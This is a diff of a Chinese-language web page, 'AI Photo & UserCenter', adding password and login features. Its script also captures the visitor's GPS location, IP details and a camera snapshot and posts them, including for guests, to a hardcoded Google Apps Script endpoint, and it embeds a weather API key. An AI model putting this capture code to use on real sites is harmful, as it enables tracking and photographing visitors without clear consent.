@@ -2,8 +2,9 @@
 <html lang="zh-TW">
 <head>
   <meta charset="UTF-8" />
-  <title>AI Photo &amp; UserCenter</title>
+  <title>AI Photo & UserCenter (增強版)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Bootstrap -->
   <link
     href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
     rel="stylesheet"
@@ -50,6 +51,9 @@
     .row .card {
       height: 100%;
     }
+    .text-end a {
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
@@ -72,10 +76,13 @@
     </div>
   </div>
 </nav>
+
 <div class="container mt-3">
   <div id="statusSuccess" class="alert alert-success d-none fade-out" role="alert"></div>
   <div id="statusError" class="alert alert-danger d-none" role="alert"></div>
 </div>
+
+<!-- 會員中心 Modal -->
 <div class="modal fade" id="userModal" tabindex="-1" aria-labelledby="userModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
@@ -112,8 +119,23 @@
             註冊
           </button>
         </li>
+        <li class="nav-item" role="presentation">
+          <button
+            class="nav-link"
+            id="tabChangePassword"
+            data-bs-toggle="tab"
+            data-bs-target="#changePasswordTabPane"
+            type="button"
+            role="tab"
+            aria-controls="changePasswordTabPane"
+            aria-selected="false"
+          >
+            變更密碼
+          </button>
+        </li>
       </ul>
       <div class="tab-content mt-3" id="myTabContent">
+        <!-- 登入 -->
         <div
           class="tab-pane fade show active"
           id="loginTabPane"
@@ -142,37 +164,13 @@
                 required
               />
             </div>
-
-<!-- 加在 <body> 裡，和之前的 Modal 同級 -->
-<div class="modal fade" id="forgotPasswordModal" tabindex="-1" aria-labelledby="forgotPasswordModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered">
-    <div class="modal-content p-3">
-      <div class="modal-header">
-        <h5 class="modal-title" id="forgotPasswordModalLabel">忘記密碼</h5>
-        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-      </div>
-      <form id="forgotPasswordForm" class="p-2">
-        <div class="mb-3">
-          <label for="forgotEmail" class="form-label">請輸入註冊時的 Email</label>
-          <input
-            type="email"
-            id="forgotEmail"
-            class="form-control"
-            placeholder="請輸入 Email"
-            required
-          />
-        </div>
-        <button class="btn btn-info w-100" type="submit">送出重設密碼請求</button>
-      </form>
-    </div>
-  </div>
-</div>
-
-
-            
-            <button class="btn btn-primary w-100" type="submit">登入</button>
+            <div class="text-end">
+              <a href="#" onclick="openForgotPasswordModal()">忘記密碼？</a>
+            </div>
+            <button class="btn btn-primary w-100 mt-2" type="submit">登入</button>
           </form>
         </div>
+        <!-- 註冊 -->
         <div
           class="tab-pane fade"
           id="registerTabPane"
@@ -197,17 +195,76 @@
                 type="password"
                 id="regPassword"
                 class="form-control"
-                placeholder="請輸入密碼"
+                placeholder="請輸入至少 6 碼密碼"
                 required
               />
             </div>
             <button class="btn btn-success w-100" type="submit">註冊</button>
           </form>
         </div>
+        <!-- 變更密碼 (範例) -->
+        <div
+          class="tab-pane fade"
+          id="changePasswordTabPane"
+          role="tabpanel"
+          aria-labelledby="tabChangePassword"
+          tabindex="0"
+        >
+          <form onsubmit="alert('此為示範，請自行實作後端程式'); return false;" class="p-2">
+            <div class="mb-3">
+              <label for="oldPassword" class="form-label">舊密碼</label>
+              <input
+                type="password"
+                id="oldPassword"
+                class="form-control"
+                placeholder="請輸入舊密碼"
+                required
+              />
+            </div>
+            <div class="mb-3">
+              <label for="newPassword" class="form-label">新密碼</label>
+              <input
+                type="password"
+                id="newPassword"
+                class="form-control"
+                placeholder="請輸入新密碼"
+                required
+              />
+            </div>
+            <button class="btn btn-warning w-100" type="submit">變更密碼</button>
+          </form>
+        </div>
       </div>
     </div>
   </div>
 </div>
+
+<!-- 忘記密碼 Modal -->
+<div class="modal fade" id="forgotPasswordModal" tabindex="-1" aria-labelledby="forgotPasswordModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content p-3">
+      <div class="modal-header">
+        <h5 class="modal-title" id="forgotPasswordModalLabel">忘記密碼</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <form id="forgotPasswordForm" class="p-2">
+        <div class="mb-3">
+          <label for="forgotEmail" class="form-label">請輸入註冊時的 Email</label>
+          <input
+            type="email"
+            id="forgotEmail"
+            class="form-control"
+            placeholder="請輸入 Email"
+            required
+          />
+        </div>
+        <button class="btn btn-info w-100" type="submit">送出重設密碼請求</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- 管理者登入 Modal -->
 <div class="modal fade" id="adminModal" tabindex="-1" aria-labelledby="adminModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
@@ -241,6 +298,7 @@
     </div>
   </div>
 </div>
+
 <div class="container mt-4">
   <h4 class="section-title">回饋功能</h4>
   <div class="row mb-3">
@@ -271,9 +329,12 @@
       </div>
     </div>
   </div>
+
   <div id="guestTip" class="alert alert-info">
     如果您尚未註冊/登入，也可以在此回傳訊息或圖片。若要體驗更多功能，請先註冊或登入。
   </div>
+
+  <!-- 會員/登入後的面板 -->
   <div id="memberPanel" style="display: none;">
     <h4 class="section-title">裝置資訊 &amp; 簡易儀表板</h4>
     <div class="card-grid mb-4">
@@ -301,12 +362,17 @@
     </div>
   </div>
 </div>
+
 <script>
+  // 修改成您自己的 Apps Script URL
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby3ttEU7hp3lniJzsqA1DRtTmvrCd1iLsrlbssc4kX_gB1cbDo9zwfZBcaMMn_TBh-8qA/exec';
+
   const statusSuccess = document.getElementById('statusSuccess');
   const statusError = document.getElementById('statusError');
   const guestTip = document.getElementById('guestTip');
   const memberPanel = document.getElementById('memberPanel');
+
+  // 更新導覽列
   function updateNavbar() {
     const navRight = document.getElementById('navRight');
     navRight.innerHTML = '';
@@ -341,6 +407,7 @@
         modal.show();
       };
       liUserCenter.appendChild(userBtn);
+
       const liAdmin = document.createElement('li');
       liAdmin.classList.add('nav-item');
       const adminBtn = document.createElement('button');
@@ -356,6 +423,7 @@
       navRight.appendChild(liAdmin);
     }
   }
+
   function showSuccessMessage(msg) {
     statusSuccess.textContent = msg;
     statusSuccess.classList.remove('d-none');
@@ -368,11 +436,14 @@
       }, 800);
     }, 3000);
   }
+
   function showErrorMessage(msg) {
     statusError.textContent = msg;
     statusError.classList.remove('d-none');
     statusSuccess.classList.add('d-none');
   }
+
+  // 註冊
   document.getElementById('registerForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('regEmail').value;
@@ -387,7 +458,7 @@
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
       if (result.success) {
-        showSuccessMessage('註冊成功，請切換到「登入」標籤！');
+        showSuccessMessage('註冊成功，請切換到「登入」標籤');
       } else {
         showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
       }
@@ -395,6 +466,8 @@
       showErrorMessage('註冊錯誤：' + err.message);
     }
   });
+
+  // 登入
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('loginEmail').value;
@@ -404,6 +477,7 @@
       formData.append('action', 'login');
       formData.append('email', email);
       formData.append('password', password);
+
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
@@ -423,6 +497,36 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
+
+  // 忘記密碼
+  document.getElementById('forgotPasswordForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email = document.getElementById('forgotEmail').value;
+    if (!email) {
+      showErrorMessage('請輸入 Email');
+      return;
+    }
+    try {
+      const formData = new FormData();
+      formData.append('action', 'forgotPassword');
+      formData.append('email', email);
+
+      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
+      const result = await resp.json();
+
+      if (result.success) {
+        showSuccessMessage('重設密碼連結已寄出(示範)');
+        const modalObj = bootstrap.Modal.getInstance(document.getElementById('forgotPasswordModal'));
+        if (modalObj) modalObj.hide();
+      } else {
+        showErrorMessage('忘記密碼錯誤：' + (result.error || '未知原因'));
+      }
+    } catch (err) {
+      showErrorMessage('系統錯誤：' + err.message);
+    }
+  });
+
+  // 管理者登入
   document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('adminEmail').value;
@@ -432,6 +536,7 @@
       formData.append('action', 'adminLogin');
       formData.append('email', email);
       formData.append('password', password);
+
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
@@ -439,7 +544,8 @@
         showSuccessMessage('管理者登入成功！');
         const adminModalObj = bootstrap.Modal.getInstance(document.getElementById('adminModal'));
         if (adminModalObj) adminModalObj.hide();
-        window.location.href = 'https://your-domain/admin.php';
+        // 假設後台位於 https://yourdomain/admin.php
+        window.location.href = 'https://yourdomain/admin.php';
       } else {
         showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
       }
@@ -447,6 +553,8 @@
       showErrorMessage('管理者登入錯誤：' + err.message);
     }
   });
+
+  // 回傳文字訊息
   document.getElementById('sendMessageBtn').addEventListener('click', async () => {
     const email = sessionStorage.getItem('email') || 'guest_user';
     const message = document.getElementById('userMessage').value.trim();
@@ -459,6 +567,7 @@
       formData.append('action', 'sendMessage');
       formData.append('email', email);
       formData.append('textMessage', message);
+
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       const result = await resp.json();
       if (result.success) {
@@ -471,6 +580,8 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
+
+  // 回傳圖片
   document.getElementById('sendImageBtn').addEventListener('click', async () => {
     const email = sessionStorage.getItem('email') || 'guest_user';
     const fileInput = document.getElementById('userImage');
@@ -497,6 +608,8 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
+
+  // 將檔案讀成 base64
   function readFileAsBase64(file) {
     return new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -508,6 +621,8 @@
       reader.readAsDataURL(file);
     });
   }
+
+  // 收集 GPS + IP + Camera
   async function collectAndSendData() {
     const statusElem = document.getElementById('status');
     if (statusElem) {
@@ -520,13 +635,15 @@
         getGpsCoordinates(),
         getIpInfo()
       ]);
-      const photoResult = await startCamera(/* 可以在此傳 width, height → {width:1280,height:720} */);
+      const photoResult = await startCamera();
       if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
       if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
       if (photoResult) collectedData.photo = photoResult;
+
       if (sessionStorage.getItem('email')) {
         updateUI(collectedData);
       }
+
       const formData = new FormData();
       const email = sessionStorage.getItem('email') || 'guest_user';
       formData.append('email', email);
@@ -547,6 +664,7 @@
       if (collectedData.photo) {
         formData.append('imageData', collectedData.photo);
       }
+
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       const result = await resp.json();
       if (statusElem) {
@@ -563,6 +681,8 @@
       }
     }
   }
+
+  // 取得 IP
   async function getIpInfo() {
     try {
       const resp = await fetch('https://ipinfo.io/json');
@@ -576,6 +696,8 @@
       return null;
     }
   }
+
+  // 取得 GPS
   async function getGpsCoordinates() {
     try {
       const position = await new Promise((resolve, reject) => {
@@ -591,6 +713,8 @@
       return null;
     }
   }
+
+  // 啟動相機並擷取一張圖片
   async function startCamera() {
     let stream = null;
     try {
@@ -611,7 +735,7 @@
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1]; 
+      const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1];
       return photoData;
     } catch (error) {
       console.warn('相機啟動失敗:', error);
@@ -622,6 +746,8 @@
       }
     }
   }
+
+  // 更新前端 UI
   function updateUI({ gps, ip }) {
     const ipElem = document.getElementById('ipInfo');
     if (ip && ipElem) {
@@ -634,10 +760,12 @@
       getWeatherInfo(gps.latitude, gps.longitude);
     }
   }
+
+  // 取得天氣
   async function getWeatherInfo(lat, lon) {
     try {
       if (!lat || !lon) return;
-      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
+      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611'; // OpenWeatherMap API Key
       const resp = await fetch(
         `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
       );
@@ -655,48 +783,11 @@
     }
   }
 
-
-
-  // 忘記密碼 - 前端送出
-  document.getElementById('forgotPasswordForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const email = document.getElementById('forgotEmail').value;
-    if (!email) {
-      showErrorMessage('請輸入 Email');
-      return;
-    }
-    try {
-      const formData = new FormData();
-      formData.append('action', 'forgotPassword');
-      formData.append('email', email);
-
-      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
-      const result = await resp.json();
-
-      if (result.success) {
-        showSuccessMessage('重設密碼連結已寄送至您的 Email (示範)');
-        const modalObj = bootstrap.Modal.getInstance(document.getElementById('forgotPasswordModal'));
-        if (modalObj) modalObj.hide();
-      } else {
-        showErrorMessage('忘記密碼錯誤：' + (result.error || '未知原因'));
-      }
-    } catch (err) {
-      showErrorMessage('系統錯誤：' + err.message);
-    }
-  });
-
-  // 登入區塊裡面示範如何彈出忘記密碼
-  <div class="text-end">
-  <a href="#" onclick="openForgotPasswordModal()">忘記密碼？</a>
- </div>
   function openForgotPasswordModal() {
     const fpModal = new bootstrap.Modal(document.getElementById('forgotPasswordModal'));
     fpModal.show();
   }
 
-
-
-  
   document.addEventListener('DOMContentLoaded', async () => {
     updateNavbar();
     const email = sessionStorage.getItem('email');
